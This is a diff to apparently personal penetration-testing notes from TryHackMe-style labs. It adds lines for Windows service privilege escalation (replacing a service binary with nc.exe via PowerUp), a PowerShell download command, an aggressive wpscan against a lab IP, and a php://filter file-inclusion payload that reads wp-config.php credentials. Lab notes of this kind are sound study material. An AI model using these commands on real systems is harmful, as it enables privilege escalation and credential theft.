@@ -95,6 +95,16 @@ cat /tmp/output
 * `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
 * https://www.joesandbox.com/#windows
 * https://github.com/EgeBalci/sgn
+* sc qc XXX
 * sc stop XXX
 * `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
 * sc start XXX
+* `powershell -c wget "URL" -outfile "OUTPUT"`
+* like OTX: https://cyware.com/
+
+--- https://tryhackme.com/room/allinonemj
+
+* Kali right-arrow
+* Test: `wpscan --url http://10.10.162.222/wordpress/ --detection-mode aggressive`
+* `php://filter/convert.base64-encode/resource=../../../../../wp-config.php` (file inclusion)
+* not finished aza.
